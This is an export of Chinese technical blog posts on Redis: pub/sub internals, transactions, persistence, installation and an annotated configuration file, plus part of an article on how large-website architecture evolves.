字典， 程序只要检查某个频道是否为字典的键， 就可以知道该频道是否正在被客户端订阅； 只要取出某个键的值， 就可以得到所有订阅该频道的客户端的信息。 了解了 pubsub_channels 字典的结构之后， 解释 PUBLISH 命令的实现就非常简单了： 当调用 PUBLISH channel message 命令， 程序首先根据 channel 定位到字典的键， 然后将信息发送给字典值链表中的所有客户端。 订阅模式redis的发布订阅不仅仅提供简单的订阅频道，还提供模式匹配订阅。模式订阅使用命令PSUBSCRIBE实现。 redisServer.pubsub_patterns 属性是一个链表，链表中保存着所有和模式相关的信息： 12345struct redisServer &#123; // ... list *pubsub_patterns; // ...&#125;; 链表中的每个节点都包含一个 redis.h/pubsubPattern 结构： 1234typedef struct pubsubPattern &#123; redisClient *client; robj *pattern;&#125; pubsubPattern; client 属性保存着订阅模式的客户端，而 pattern 属性则保存着被订阅的模式。 每当调用 PSUBSCRIBE 命令订阅一个模式时， 程序就创建一个包含客户端信息和被订阅模式的 pubsubPattern 结构， 并将该结构添加到 redisServer.pubsub_patterns 链表中。 作为例子，下图展示了一个包含两个模式的 pubsub_patterns 链表， 其中 client123 和 client256 都正在订阅 tweet.shop.* 模式： 通过遍历整个 pubsub_patterns 链表，程序可以检查所有正在被订阅的模式，以及订阅这些模式的客户端。 当执行PUBLISH进行命令向channel命令发送消息时，PUBLISH 除了将 message 发送到所有订阅 channel 的客户端之外， 它还会将 channel 和 pubsub_patterns 中的模式进行对比， 如果 channel 和某个模式匹配的话， 那么也将 message 发送到订阅那个模式的客户端，例如一个客户端订阅了aa.bb.*频道，那么他会收到来自所有aa.bb开头的所有频道消息。 相关命令1234567891011PSUBSCRIBE pattern [pattern ...] #使用模式订阅一个或多个符合给定模式的频道PUNSUBSCRIBE [pattern [pattern ...]] #退订所有给定模式的频道SUBSCRIBE channel [channel ...] #订阅给定的一个或多个频道的信息UNSUBSCRIBE [channel [channel ...]] #指退订给定的频道PUBSUB subcommand [argument [argument ...]] #查看订阅与发布系统状态PUBLISH channel message #将信息发送到指定的频道 实践在以下示例中，将分别用SUBSCRIBE命令订阅aa.bb和使用PSUBSCRIBE模式订阅频道aa.bb*。 SUBSCRIBE订阅： PSUBSCRIBE订阅： 此时我们使用PUBSH向aa.bb发送消息，返回接受到的频道数，两个订阅者都能收到消息。 订阅者1: 模式订阅者： 小结 订阅信息由服务器进程维持的 redisServer.pubsub_channels 字典保存，字典的键为被订阅的频道，字典的值为订阅频道的所有客户端。 当有新消息发送到频道时，程序遍历频道（键）所对应的（值）所有客户端，然后将消息发送到所有订阅频道的客户端上。 订阅模式的信息由服务器进程维持的 redisServer.pubsub_patterns 链表保存，链表的每个节点都保存着一个 pubsubPattern 结构，结构中保存着被订阅的模式，以及订阅该模式的客户端。程序通过遍历链表来查找某个频道是否和某个模式匹配。 当有新消息发送到频道时，除了订阅频道的客户端会收到消息之外，所有订阅了匹配频道的模式的客户端，也同样会收到消息。 退订频道和退订模式分别是订阅频道和订阅模式的反操作。 事务所谓事务应具有以下特效：原子性(Atomicity)， 一致性(Consistency)，隔离性(Isolation)，持久性(Durability)，简称ACID，但redis所提供的事务比较简单，它通过MULTI、EXEC、DISCARD和WATCH等命令实现事务。 而Redis只支持简单的事务，将执行命令放入队列缓存，当程序中有异常或命令出错，执行DISCARD清空缓存队列不执行队列中命令，其事务过程有以下特点： 事务是一个单独的隔离操作：事务中的所有命令都会序列化、按顺序地执行。事务在执行的过程中，不会被其他客户端发送来的命令请求所打断。 事务是一个 泛原子 操作（这里我以泛原子称呼，在某些情况redis的事务不是原子性的，后续会说明）：事务中的命令要么全部被执行，要么全部都不执行。 EXEC 命令负责触发并执行事务中的所有命令： 如果客户端在使用 MULTI 开启了一个事务之后，却因为断线而没有成功执行 EXEC ，那么事务中的所有命令都不会被执行。 另一方面，如果客户端成功在开启事务之后执行 EXEC ，那么事务中的所有命令都会被执行。 特别说明文中的 泛原子操作 ： redis在开启事务以后，若执行命令具有显示的错误或者客户端中断则此次事务在执行EXEC命令时会调用DISCARD清空缓存队列不执行队列中的所有任务，此时是原子性的。 当执行命令过程中，命令没有显示的报错（例如LSET操作设置一个不存在的list），而是在EXEC调用时候某个命令出错，那么在这之前已经执行的命令将不会回滚，所以严格说来， redis并不支持原子性。 命令123456789MULTI #用于标记事务块的开始。Redis会将后续的命令逐个放入队列中，然后才能使用EXEC命令执行缓存队列中的命令。EXEC #执行缓存队列中的命令DISCARD #清除所有先前在一个事务中放入队列的命令，然后恢复正常的连接状态，如果使用了WATCH命令，那么DISCARD命令就会将当前连接监控的所有键取消监控。WATCH key [key ...] #当某个事务需要按条件执行时，就要使用这个命令将给定的键设置为受监控的UNWATCH #清除所有先前为一个事务监控的键，如果你调用了EXEC或DISCARD命令，那么就不需要手动调用UNWATCH命令 乐观锁机制乐观锁：总是认为不会产生并发问题，每次去取数据的时候总认为不会有其他线程对数据进行修改，因此不会上锁，但是在更新时会判断其他线程在这之前有没有对数据进行修改，一般会使用版本号机制或检查再设置(CAS)操作实现。 redis通过WATCH命令实现乐观锁，作为WATCH命令的参数的键会受到Redis的监控，Redis能够检测到它们的变化。在执行EXEC命令之前，如果Redis检测到至少有一个键被修改了，那么整个事务便会中止运行，然后EXEC命令会返回一个nil值，提醒用户事务运行失败。 注意：WATCH命令需要在MULTI之前执行，不然redis会将其一个命令放入缓存队列中。 示例：在以下示例中通过一个客户端开启事务监听name键，另一个客户端在执行EXEC之前修改name键，此次事务将不会执行，并返回nil，如下。 原子性实践为演示redis严格意义上将不支持原子性，做了一些简单实践。 从上面的结果可以看出，在开启事务前name 值为Rose，在开启事务先后执行了SET命令和LSET命令，但是LSET命令是错误的，当我们调用EXEC执行事务完事务以后，在回头看事务中的SET命令已经生效，并未回滚，因为在次过程中该命令没有显示的报错，所以可以说redis的事务不支持原子性。 Redis的持久化redis持久有两种方式：快照（快照），仅附加文件（AOF). 快照1，将存储在内存的数据以快照的方式写入二进制文件中，如默认dump.rdb中2，保存900 1 ＃900秒内如果超过1个Key被修改，则启动快照保存3，保存300 10 ＃300秒内如果超过10个Key被修改，则启动快照保存4，保存60 10000 ＃60秒内如果超过10000个重点被修改，则启动快照保存 仅附加文件（AOF）1，使用AOF持久时，服务会将每个收到的写命令通过写函数追加到文件中（appendonly.aof）2，AOF持久化存储方式参数说明 1234appendonly yes ＃开启AOF持久化存储方式 appendfsync always ＃收到写命令后就立即写入磁盘，效率最差，效果最好appendfsync everysec ＃每秒写入磁盘一次，效率与效果居中appendfsync no ＃完全依赖操作系统，效率最佳，效果没法保证 Redis的性能测试自带相关测试工具 实际测试同时执行100万的请求]]></content>
      <categories>
        <category>数据库运维</category>
        <category>Nosql详解</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redis系列之安装]]></title>
    <url>%2Farticles%2F72cca2b5.html</url>
    <content type="text"><![CDATA[前言redis作为nosql家族中非常热门的一员，也是被大型互联网公司所青睐，无论你是开发、测试或者运维，学习掌握它总会为你的职业生涯增色添彩。本文介绍Redis的安装及配置详解。 redis简介概述redis(REmote DIctionary Server)是一个由Salvatore Sanfilippo写key-value存储系统，它由C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value类型的数据库，并提供多种语言的API。和Memcached类似，它支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)、zset(sorted set –有序集合)和hash（哈希类型）。这些数据类型都支持push/pop、add/remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，redis支持各种不同方式的排序。与memcached一样，为了保证效率，数据都是缓存在内存中。区别的是redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步，redis在3.0版本推出集群模式。 特点、优势 k、v键值存储以及数据结构存储（如列表、字典） 所有数据(包括数据的存储)操作均在内存中完成 单线程服务(这意味着会有较多的阻塞情况)，采用epoll模型进行请求响应，对比nginx 支持主从复制模式，更提供高可用主从复制模式（哨兵） 去中心化分布式集群 丰富的编程接口支持，如Python、Golang、Java、php、Ruby、Lua、Node.js 功能丰富，除了支持多种数据结构之外，还支持事务、发布/订阅、消息队列等功能 支持数据持久化(AOF、RDB) 对比memcache memcache是一个分布式的内存对象缓存系统，并不提供持久存储功能，而redis拥有持久化功能 memcache数据存储基于LRU(简单说：最近、最少使用key会被剔除)，而redis则可以永久保存(服务一直运行情况下) memcache是多线程的（这是memcache优势之一），也就意味着阻塞情况少，而redis是单线程的，阻塞情况相对较多 两者性能上相差不大 memcache只支持简单的k、v数据存储，而redis支持多种数据格式存储。 memcache是多线程、非阻塞IO复用网络模型，而redis是单线程IO复用模型 安装部署12345678910111213141516yum install gcc -y #安装C依赖wget http://download.redis.io/redis-stable.tar.gz #下载稳定版本tar zxvf redis-stable.tar.gz #解压cd redis-stablemake PREFIX=/opt/redis test #指定目录编译，也可以不用指定make install####启动与停止/etc/init.d/redis start/etc/init.d/redis stop 开机自启动1，设置redis.conf中daemonize为yes,确保守护进程开启,也就是在后台可以运行. 1234vi /etc/redis/6379.conf #修改配置文件： bind 0.0.0.0 #监听地址maxmemory 4294967296 #限制最大内存（4G）：daemonize yes #后台运行 复制redis配置文件(启动脚本需要用到配置文件内容,所以要复制) 1`[root@localhost /]# mkdir /etc/redis #在/etc下新建redis文件夹``[root@localhost redis]# cp /opt/redis-3.0.5/redis.conf /etc/redis/6379.conf #把安装redis目录里面的redis.conf文件复制到/etc/redis/6379.conf里面,6379.conf启动脚本里面的变量会读取这个名称,6379是redis的端口号 ` 复制redis启动脚本 1`[root@localhost redis]# find / -name redis_init_script #redis启动脚本一般在redis根目录的utils,如果不知道路径,可以先查看路径``/usr/redis/redis-3.2.4/utils/redis_init_script``[root@localhost redis]# cp /opt/redis-3.0.5/utils/redis_init_script /etc/init.d/redis #复制启动脚本到/etc/rc.d/init.d/redis文件中` 修改启动脚本参数 1`[root@localhost redis]# vim /etc/rc.d/init.d/redis``#在/etc/init.d/redis文件的头部添加下面两行注释代码,也就是在文件中#!/bin/sh的下方添加``# chkconfig: 2345 10 90 ``# description: Start and Stop redis` 同时还要修改参数,指定redis的安装路径 1`以下是我的安装路径：``REDISPORT=6379``EXEC=/opt/redis-3.0.5/src/redis-server``CLIEXEC=/opt/redis-3.0.5/src/redis-cli` 设置redis开机自启动 123456789101112chkconfig --add redis chkconfig redis on #开启开机启动chkconfig redis off #关闭开机启动#打开redis命令：service redis start#关闭redis命令：service redis stop#重启redis命令：service redis restart 验证1234#执行客户端工具redis-cli #输入命令info127.0.0.1:6379&gt; info 执行文件说明redis安装完成后会有以下可执行文件（window下是exe文件）生成，下面是各个文件的作用。 123456redis-server #Redis服务器和Sentinel服务器，启动时候可使用--sentinel指定为哨兵redis-cli #Redis命令行客户端 redis-benchmark #Redis性能测试工具 redis-check-aof #AOF文件修复工具 redis-check-dump #RDB文件检测工具 redis-sentinel #Sentinel服务器,4.0版本已经做了软链接到redis-server 配置详解redis所有的配置参数都可以通过客户端通过“CONFIG GET 参数名” 获取，参数名支持通配符，如*代表所有。所得结果并按照顺序分组，第一个返回结果是参数名，第二个结果是参数对应的值。 除了查看配置还可以使用CONFIG SET修改配置，写入配置文件使用CONFIG REWRITE,使用时是需要注意某些关于服务配置参数慎重修改，如bind。 配置参数以及解释，需要注意的是，有些配置是4.0.10新增的，有些配置已经废除，如vm相关配置，和集群相关配置在集群篇章在进行补充。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209logfile#日志文件位置及文件名称bind 0.0.0.0#监听地址，可以有多个 如bind 0.0.0.0 127.0.0.1daemonize yes#yes启动守护进程运行，即后台运行，no表示不启用pidfile /var/run/redis.pid # 当redis在后台运行的时候，Redis默认会把pid文件在在/var/run/redis.pid，也可以配置到其他地方。# 当运行多个redis服务时，需要指定不同的pid文件和端口port 6379# 指定redis运行的端口，默认是6379unixsocket #sock文件位置unixsocketperm#sock文件权限timeout 0# 设置客户端连接时的超时时间，单位为秒。当客户端在这段时间内没有发出任何指令，那么关闭该连接， 0是关闭此设置loglevel debug# 指定日志记录级别，Redis总共支持四个级别：debug、verbose、notice、warning，默认为verboselogfile ""# 日志文件配置,默认值为stdout，标准输出，若后台模式会输出到/dev/nullsyslog-enabled# 是否以syslog方式记录日志，yes开启no禁用，与该配置相关配置syslog-ident 和syslog-facility local0 分别是指明syslog的ident和facilitydatabases 16#配置可用的数据库个数，默认值为16，默认数据库为0，数据库范围在0-（database-1）之间always-show-logo yes #4.0以后新增配置#是否配置日志显示redis徽标，yes显示no不显示################################ 快照相关配置 #################################save 900 1save 300 10save 60 10000#配置快照(rdb)促发规则，格式：save &lt;seconds&gt; &lt;changes&gt;#save 900 1 900秒内至少有1个key被改变则做一次快照#save 300 10 300秒内至少有300个key被改变则做一次快照#save 60 10000 60秒内至少有10000个key被改变则做一次快照dbfilename dump.rdb#rdb持久化存储数据库文件名，默认为dump.rdbstop-write-on-bgsave-error yes #yes代表当使用bgsave命令持久化痤疮时候禁止写操作rdbchecksum yes#开启rdb文件校验dir "/etc"#数据文件存放目录，rdb快照文件和aof文件都会存放至该目录################################# 复制相关配置参数 #################################slaveof &lt;masterip&gt; &lt;masterport&gt; #设置该数据库为其他数据库的从数据库，设置当本机为slave服务时，设置master服务的IP地址及端口，在Redis启动时，它会自动从master进行数据同步masterauth &lt;master-password&gt;#主从复制中，设置连接master服务器的密码（前提master启用了认证）slave-serve-stale-data yes# 当从库同主机失去连接或者复制正在进行，从机库有两种运行方式：# 1) 如果slave-serve-stale-data设置为yes(默认设置)，从库会继续相应客户端的请求# 2) 如果slave-serve-stale-data是指为no，除了INFO和SLAVOF命令之外的任何请求都会返回一个错误"SYNC with master in progress"repl-ping-slave-period 10#从库会按照一个时间间隔向主库发送PING命令来判断主服务器是否在线，默认是10秒repl-timeout 60#设置主库批量数据传输时间或者ping回复时间间隔超时时间，默认值是60秒# 一定要确保repl-timeout大于repl-ping-slave-periodrepl-backlog-size 1mb#设置复制积压大小,只有当至少有一个从库连入才会释放。slave-priority 100#当主库发生宕机时候，哨兵会选择优先级最高的一个称为主库，从库优先级配置默认100，数值越小优先级越高min-slaves-to-write 3min-slaves-max-lag 10#设置某个时间断内，如果从库数量小于该某个值则不允许主机进行写操作，以上参数表示10秒内如果主库的从节点小于3个，则主库不接受写请求，min-slaves-to-write 0代表关闭此功能。################################## 安全相关配置 ###################################requirepass#客户端连接认证的密码，默认为空，即不需要密码，若配置则命令行使用AUTH进行认证maxclients 10000# 设置同一时间最大客户端连接数，4.0默认10000，Redis可以同时打开的客户端连接数为Redis进程可以打开的最大文件描述符数，# 如果设置 maxclients 0，表示不作限制。# 当客户端连接数到达限制时，Redis会关闭新的连接并向客户端返回max number of clients reached错误信息maxmemory 4gb#设置最大使用的内存大小maxmemory-policy noeviction#设置达到最大内存采取的策略：# volatile-lru -&gt; 利用LRU算法移除设置过过期时间的key (LRU:最近使用 Least Recently Used )# allkeys-lru -&gt; 利用LRU算法移除任何key# volatile-random -&gt; 移除设置过过期时间的随机key# allkeys-&gt;random -&gt; remove a random key, any key# volatile-ttl -&gt; 移除即将过期的key(minor TTL)# 4.0默认noeviction代表不删除任何key，只在写操作时候返回错误。maxmemory-samples 5#LRU，LFU等算法样本设置，默认5个key############################## AOF相关配置###############################appendonly no# 设置AOF持久化，yes开启，no禁用，开启后redis会把所接收到的每一次写操作请求都追加到appendonly.aof文件中，当redis重新启动时，会从该文件恢复出之前的状态。# 但是这样会造成appendonly.aof文件过大，所以redis还支持了BGREWRITEAOF指令，对appendonly.aof 进行重写。appendfilename "appendonly.aof"#设置AOF文件名appendfsync everysec# AOF文件写策略，Redis支持三种同步AOF文件的策略:# no: 不进行同步，交给操作系统去执行 ，速度较快# always: always表示每次有写操作都调用fsync方法强制内核将该写操作写入到文件，速度会慢, 但是安全，因为每次写操作都在AOF文件中.# everysec: 表示对写操作进行累积，每秒同步一次，折中方案.# 默认是"everysec"，按照速度和安全折中这是最好的。no-appendfsync-on-rewrite no# AOF策略设置为always或者everysec时，后台处理进程(后台保存或者AOF日志重写)会执行大量的I/O操作# 在某些Linux配置中会阻止过长的fsync()请求。注意现在没有任何修复，即使fsync在另外一个线程进行处理，为了减缓这个问题，可以设置下面这个参数no-appendfsync-on-rewriteauto-aof-rewrite-percentage 100auto-aof-rewrite-min-size 64mb#当AOF文件增长到一定大小的时候Redis能够调用BGREWRITEAOF对日志文件进行重写，它是这样工作的：Redis会记住上次进行些日志后文件的大小(如果从开机以来还没进行过重写，那日子大小在开机的时候确定)。#基础大小会同现在的大小进行比较。如果现在的大小比基础大小大制定的百分比，重写功能将启动# 同时需要指定一个最小大小用于AOF重写，这个用于阻止即使文件很小但是增长幅度很大也去重写AOF文件的情况# 设置 percentage 为0就关闭这个特性#auto-aof-rewrite-percentage 代表AOF文件每次重写文件大小（以百分数代表），100表示百分之百，即当文件增加了1倍（100%），则开始重写AOF文件#auto-aof-rewrite-min-size 设置最小重写文件大小，避免文件小而执行太多次的重写aof-load-truncated yes＃当redis突然运行崩溃时，会出现aof文件被截断的情况，Redis可以在发生这种情况时退出并加载错误，以下选项控制此行为。＃如果aof-load-truncated设置为yes，则加载截断的AOF文件，Redis服务器启动发出日志以通知用户该事件。＃否则，如果该选项设置为no，则服务器将中止并显示错误并停止启动。当该选项设置为no时，用户需要在重启之前使用“redis-check-aof”实用程序修复AOF文件在进行重启################################## 慢查询配置 ###################################slowlog-log-slower-than 10000 #Redis Slow Log 记录超过特定执行时间的命令。执行时间不包括I/O计算比如连接客户端，返回结果等，只是命令执行时间，可以通过两个参数设置slow log：一个是告诉Redis执行超过多少时间被记录的参数slowlog-log-slower-than(微秒，因此1000000代表一分钟#另一个是slow log 的长度。当一个新命令被记录的时候最早的命令将被从队列中移除 slowlog-max-len 128#慢查询命令记录队列长度设置，该队列占用内存，可以使用SLOWLOG RESET清空队列############################### 高级配置 ###############################hash-max-zipmap-entries 512hash-max-zipmap-value 64# 当hash中包含超过指定元素个数并且最大的元素没有超过临界时，hash将以一种特殊的编码方式（大大减少内存使用）来存储，这里可以设置这两个临界值# Redis Hash对应Value内部实际就是一个HashMap，实际这里会有2种不同实现，# 这个Hash的成员比较少时Redis为了节省内存会采用类似一维数组的方式来紧凑存储，而不会采用真正的HashMap结构，对应的value redisObject的encoding为zipmap,当成员数量增大时会自动转成真正的HashMap,此时encoding为ht。list-max-ziplist-size -2#Lists也以特殊方式编码，以节省大量空间。＃可以指定每个内部列表节点允许的条目数＃作为固定的最大大小或最大元素数。＃对于固定的最大大小，使用-5到-1表示：＃-5：最大大小：64 Kb &lt; - 不建议用于正常工作负载＃-4：最大尺寸：32 Kb &lt; - 不推荐＃-3：最大尺寸：16 Kb &lt; - 可能不推荐＃-2：最大尺寸：8 Kb &lt; - 好＃-1：最大尺寸：4 Kb &lt; - 良好＃正数意味着存储_exactly_元素数量＃每个列表节点。＃性能最高的选项通常为-2（8 Kb大小）或-1（4 Kb大小）zset-max-ziplist-entries 128zset-max-ziplist-value 64# list数据类型多少节点以下会采用去指针的紧凑存储格式。# list数据类型节点值大小小于多少字节会采用紧凑存储格式。activerehashing yes# Redis将在每100毫秒时使用1毫秒的CPU时间来对redis的hash表进行重新hash，可以降低内存的使用# 当你的使用场景中，有非常严格的实时性需要，不能够接受Redis时不时的对请求有2毫秒的延迟的话，把这项配置为no。# 如果没有这么严格的实时性要求，可以设置为yes，以便能够尽可能快的释放内存client-output-buffer-limit normal 0 0 0client-output-buffer-limit slave 256mb 64mb 60client-output-buffer-limit pubsub 32mb 8mb 60#客户端输出缓冲区限制可用于强制断开客户端，由于某种原因，没有足够快地从服务器读取数据，常见的原因是Pub / Sub客户端不能像很快的消费一条消息，可以为三种不同类型的客户端设置不同的限制：#normal - &gt;普通客户端，包括MONITOR客户端#subve - &gt;从服务器客户端#pubsub - &gt;客户端订阅了至少一个pubsub通道或模式#设置方法：client-output-buffer-limit 软限制大小 硬限制大小 秒数#当客户端达到硬限制大小则立即断开连接，当客户端达到软限制时候并且在设置的秒数缓冲大小任然超了，则在设置的秒数后断开连接]]></content>
      <categories>
        <category>数据库运维</category>
        <category>Nosql详解</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redis系列之介绍]]></title>
    <url>%2Farticles%2F3c05f63f.html</url>
    <content type="text"><![CDATA[redis简介redis是Nosql数据库中使用较为广泛的非关系型内存数据库。redis内部是一个key-value存储系统。它支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)、zset(sorted set –有序集合)和hash（哈希类型，类似于Java中的map）。Redis基于内存运行并支持持久化的NoSQL数据库，是当前最热门的NoSql数据库之一，也被人们称为数据结构服务器。 数据库瓶颈传统的关系数据库存在哪些瓶颈或问题，让我们考虑类似redis这样的Nosql数据库呢？1） 当数据量的总大小一个机器放不下时。2） 数据索引一个机器的内存放不下时。3） 访问量（读写混合）一个实例放不下时。 数据库模型演变单机时代模型 如果每次存储成千上万条数据，这样会导致mysql的性能很差，存储以及读取速度很慢，然后就演变成缓存+mysql+垂直拆分的方式。 Cache作为中间缓存，将所有的数据先保存到缓存中，然后再存入mysql中，减小数据库压力，提高效率。但是当数据再次增加到又一个量级，上面的方式也不能满足需求，由于数据库的写入压力增加，Memcached只能缓解数据库的读取压力。读写集中在一个数据库上让数据库不堪重负，大部分网站开始使用主从复制技术来达到读写分离，以提高读写性能和读库的可扩展性。Mysql的master-slave模式成为这个时候的网站标配了。 主从分离模式，在redis的高速缓存，MySQL的主从复制，读写分离的基础之上，这时MySQL主库的写压力开始出现瓶颈，而数据量的持续猛增，由于MyISAM使用表锁，在高并发下会出现严重的锁问题，大量的高并发MySQL应用开始使用InnoDB引擎代替MyISAM。 分表分库模式将变化小的、业务相关的放在一个数据库，变化多的，不相关的数据放在一个数据库。 Nosql数据库的优势1）易扩展这些类型的数据存储不需要固定的模式，无需多余的操作就可以进行横向的扩展。相对于关系型数据库可以减少表和字段特别多的情况。也无型之间在架构的层面上带来了可扩展的能力2）大数据量提高性能3）多样灵活的数据模型在nosql中不仅可以存储String，hash，set、Zset等数据类型，还可以保存javaBean以及多种复杂的数据类型。 Redis的应用场景缓存：毫无疑问这是Redis当今最为人熟知的使用场景。再提升服务器性能方面非常有效； 排行榜：如果使用传统的关系型数据库来做这个事儿，非常的麻烦，而利用Redis的SortSet数据结构能够非常方便搞定； 计算器/限速器：利用Redis中原子性的自增操作，我们可以统计类似用户点赞数、用户访问数等，这类操作如果用MySQL，频繁的读写会带来相当大的压力；限速器比较典型的使用场景是限制某个用户访问某个API的频率，常用的有抢购时，防止用户疯狂点击带来不必要的压力； 好友关系：利用集合的一些命令，比如求交集、并集、差集等。可以方便搞定一些共同好友、共同爱好之类的功能； 简单消息队列：除了Redis自身的发布/订阅模式，我们也可以利用List来实现一个队列机制，比如：到货通知、邮件发送之类的需求，不需要高可靠，但是会带来非常大的DB压力，完全可以用List来完成异步解耦； Session共享：以PHP为例，默认Session是保存在服务器的文件中，如果是集群服务，同一个用户过来可能落在不同机器上，这就会导致用户频繁登陆；采用Redis保存Session后，无论用户落在那台机器上都能够获取到对应的Session信息。 Redis的局限性Redis感觉能干的事情特别多，但它不是万能的，合适的地方用它事半功倍。如果滥用可能导致系统的不稳定、成本增高等问题。 比如，用Redis去保存用户的基本信息，虽然它能够支持持久化，但是它的持久化方案并不能保证数据绝对的落地，并且还可能带来Redis性能下降，因为持久化太过频繁会增大Redis服务的压力。 简单总结就是数据量太大、数据访问频率非常低的业务都不适合使用Redis，数据太大会增加成本，访问频率太低，保存在内存中纯属浪费资源。 选择理由上面说了Redis的一些使用场景，那么这些场景的解决方案也有很多其它选择，比如缓存可以用Memcache，Session共享还能用MySql来实现，消息队列可以用RabbitMQ，我们为什么一定要用Redis呢？ 速度快: 完全基于内存，使用C语言实现，网络层使用epoll解决高并发问题，单线程模型避免了不必要的上下文切换及竞争条件； 注意：单线程仅仅是说在网络请求这一模块上用一个线程处理客户端的请求，像持久化它就会重开一个线程/进程去进行处理 丰富的数据类型: Redis有8种数据类型，当然常用的主要是 String、Hash、List、Set、 SortSet 这5种类型，他们都是基于键值的方式组织数据。每一种数据类型提供了非常丰富的操作命令，可以满足绝大部分需求，如果有特殊需求还能自己通过 lua 脚本自己创建新的命令（具备原子性）； 除了提供的丰富的数据类型，Redis还提供了像慢查询分析、性能测试、Pipeline、事务、Lua自定义命令、Bitmaps、HyperLogLog、发布/订阅、Geo等个性化功能。 Redis的代码开源在GitHub，代码非常简单优雅，任何人都能够吃透它的源码；它的编译安装也是非常的简单，没有任何的系统依赖；有非常活跃的社区，各种客户端的语言支持也是非常完善。另外它还支持事务（没用过）、持久化、主从复制让高可用、分布式成为可能。 你还在等什么，和我一起用redis吧。]]></content>
      <categories>
        <category>数据库运维</category>
        <category>Nosql详解</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[大型网站架构演变]]></title>
    <url>%2Farticles%2F4964e843.html</url>
    <content type="text"><![CDATA[目的世间几乎所有东西都不是一蹴而就的，都是有个演变过程。互联网公司也都是从一个小网站开始，渐进地发展起来的。例如：中国的BAT，TMD，美国的Google,Youtube,Facebook等等都是这样的。Facebook 是扎克伯格同学在哈佛大学的宿舍里开发的；Google 的第一台服务器部署在斯坦福大学的实验室；阿里巴巴是在马云家的客厅诞生的。本文通过详解大型网站的演变过程，让你对公司网站以后优化改进方向有一个清晰的认识。 大型网站系统的特点高并发，大流量需要面对高并发用户，大流量访问。Google 日均 PV 35 亿，日 IP 访问数 3 亿；腾讯 QQ 的最大在线用户数 1.4 亿（2011年数据）。 高可用系统 7 x 24 小时不间断服务。 海量数据需要存储、管理海量数据，需要使用大量服务器。Facebook 每周上传的照片数量接近 10 亿，百度收录的网页数目有数百亿，Google 有近百万台服务器为全球用户提供服务。 用户分布广泛，网络情况复杂许多大型互联网站都是为全球用户提供服务的，用户分布范围广，各地网络情况千差万别。在国内，还有各个运营商网络互通难的问题。 安全环境恶劣由于互联网的开放性，使得互联网站更容易受到攻击，大型网站几乎每天都会被黑客攻击。 需求快速变更，发布频繁和传统软件的版本发布频率不同，互联网产品为快速适应市场，满足用户需求，其产品发布频率极高。一般大型网站的产品每周都有新版本发布上线，中小型网站的发布更频繁，有时候一天会发布几十次。 渐进式发展几乎所有的大型互联网网站都是从一个小网站开始，渐进地发展起来的。Facebook 是扎克伯格同学在哈佛大学的宿舍里开发的；Google 的第一台服务器部署在斯坦福大学的实验室；阿里巴巴是在马云家的客厅诞生的。好的互联网产品都是慢慢运营出来的，不是一开始就开发好的，这也正好与网站架构的发展演化过程对应。 大型网站架构演化发展历程大型网站的技术挑战主要来自于庞大的用户，高并发的访问和海量的数据，任何简单的业务一旦需要处理数以 P 计的数据和面对数以亿计的用户，问题就会变得很棘手。大型网站架构主要解决这类问题。 初始阶段的网站架构大型网站都是从小型网站发展而来，网站架构也是一样，是从小型网站架构逐步演化而来。小型网站最开始没有太多人访问，只需要一台服务器就绰绰有余，这时的网站架构如下图所示： 应用程序、数据库、文件等所有资源都在一台服务器上。 应用服务和数据服务分离随着网站业务的发展，一台服务器逐渐不能满足需求：越来越多的用户访问导致性能越来越差，越来越多的数据导致存储空间不足。这时就需要将应用和数据分离。应用和数据分离后整个网站使用3台服务器：应用服务器、文件服务器和数据库服务器。这 3 台服务器对硬件资源的要求各不相同： 应用服务器需要处理大量的业务逻辑，因此需要更快更强大的CPU； 数据库服务器需要快速磁盘检索和数据缓存，因此需要更快的磁盘和更大的内存； 文件服务器需要存储大量用户上传的文件，因此需要更大的硬盘。 此时，网站系统的架构如下图所示： 应用和数据分离后，不同特性的服务器承担不同的服务角色，网站的并发处理能力和数据存储空间得到了很大改善，支持网站业务进一步发展。但是随着用户逐渐增多，网站又一次面临挑战：数据库压力太大导致访问延迟，进而影响整个网站的性能，用户体验受到影响。这时需要对网站架构进一步优化。 使用缓存改善网站性能网站访问的特点和现实世界的财富分配一样遵循二八定律：80% 的业务访问集中在20% 的数据上。既然大部分业务访问集中在一小部分数据上，那么如果把这一小部分数据缓存在内存中，就可以减少数据库的访问压力，提高整个网站的数据访问速度，改善数据库的写入性能了。 网站使用的缓存可以分为两种：缓存在应用服务器上的本地缓存和缓存在专门的分布式缓存服务器上的远程缓存。 本地缓存的访问速度更快一些，但是受应用服务器内存限制，其缓存数据量有限，而且会出现和应用程序争用内存的情况。 远程分布式缓存可以使用集群的方式，部署大内存的服务器作为专门的缓存服务器，可以在理论上做到不受内存容量限制的缓存服务。 使用缓存后，数据访问压力得到有效缓解，但是单一应用服务器能够处理的请求连接有限，在网站访问高峰期，应用服务器成为整个网站的瓶颈。 使用应用服务器集群改善网站的并发处理能力使用集群是网站解决高并发、海量数据问题的常用手段。当一台服务器的处理能力、存储空间不足时，不要企图去更换更强大的服务器，对大型网站而言，不管多么强大的服务器，都满足不了网站持续增长的业务需求。这种情况下，更恰当的做法是增加一台服务器分担原有服务器的访问及存储压力。 对网站架构而言，只要能通过增加一台服务器的方式改善负载压力，就可以以同样的方式持续增加服务器不断改善系统性能，从而实现系统的可伸缩性。应用服务器实现集群是网站可伸缩架构设计中较为简单成熟的一种，如下图所示： 通过负载均衡调度服务器，可以将来自用户浏览器的访问请求分发到应用服务器集群中的任何一台服务器上，如果有更多用户，就在集群中加入更多的应用服务器，使应用服务器的压力不再成为整个网站的瓶颈。 